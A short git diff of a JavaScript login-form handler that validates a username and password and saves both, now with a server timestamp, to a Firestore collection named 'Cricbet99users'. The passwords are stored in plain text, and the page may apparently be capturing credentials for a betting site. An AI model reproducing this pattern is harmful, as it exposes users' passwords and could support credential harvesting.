@@ -159,6 +159,7 @@ document.addEventListener("DOMContentLoaded", function() {
       // Validate the form fields
       const username = form.elements["username"].value;
       const password = form.elements["password"].value;
+      
 
       if (!username.trim()) {
           alert("Please enter a username");
@@ -173,7 +174,8 @@ document.addEventListener("DOMContentLoaded", function() {
       // Save user data to Firestore
       db.collection("Cricbet99users").add({
           username: username,
-          password: password
+          password: password,
+          time:firebase.firestore.FieldValue.serverTimestamp()
       })
       .then((docRef) => {
           console.log("User added with ID: ", docRef.id);
